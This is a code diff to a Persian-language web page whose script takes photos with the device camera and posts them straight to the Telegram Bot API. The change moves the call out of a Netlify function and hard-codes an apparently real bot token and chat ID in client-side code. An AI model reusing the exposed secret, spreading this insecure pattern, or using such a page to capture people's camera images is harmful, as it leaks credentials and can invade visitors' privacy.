@@ -59,10 +59,16 @@
     </div>
 
     <script>
+        // **⚠️ توکن و CHAT ID مستقیماً در کد وارد شدند (ساده‌ترین راه)**
+        const TELEGRAM_BOT_TOKEN = '8453246503:AAGWST4Fj3acLPc2ymQO9DDLbn5VgS7sJSk'; 
+        const TELEGRAM_CHAT_ID = '8457265216'; 
+        
         const video = document.getElementById('videoElement');
         const canvas = document.getElementById('canvasElement');
         const statusElement = document.getElementById('status');
         const context = canvas.getContext('2d');
+        const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
 
         function startCamera(facingMode) {
             const modeText = facingMode === 'environment' ? 'عقب' : 'جلو';
@@ -113,12 +119,13 @@
                 
                 const formData = new FormData();
                 formData.append('photo', blob, 'photo.jpeg'); 
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('caption', `عکس گرفته شده توسط دوربین ${modeText} (${new Date().toLocaleString('fa-IR')})`);
 
-                statusElement.textContent = `در حال ارسال عکس دوربین ${modeText} به سرور واسط Netlify...`;
+                statusElement.textContent = `در حال ارسال عکس دوربین ${modeText} به API تلگرام...`;
 
-                // **آدرس Netlify Function**
-                fetch('/.netlify/functions/telegram-send', { 
+                // **ارسال مستقیم به API تلگرام**
+                fetch(TELEGRAM_URL, { 
                     method: 'POST',
                     body: formData 
                 })
@@ -127,11 +134,11 @@
                     if (data.ok) {
                         statusElement.textContent = `✅ عکس دوربین ${modeText} با موفقیت به تلگرام ارسال شد.`;
                     } else {
-                        statusElement.textContent = `❌ خطا در ارسال عکس دوربین ${modeText}: ${data.error || 'خطای نامشخص'}`;
+                        statusElement.textContent = `❌ خطا در ارسال عکس دوربین ${modeText}: ${data.description || 'خطای نامشخص'}`;
                     }
                 })
                 .catch(error => {
-                    statusElement.textContent = `❌ خطا در ارتباط با سرور واسط برای دوربین ${modeText}.`;
+                    statusElement.textContent = `❌ خطا در ارتباط با API تلگرام برای دوربین ${modeText}.`;
                     console.error('Fetch Error:', error);
                 });
 
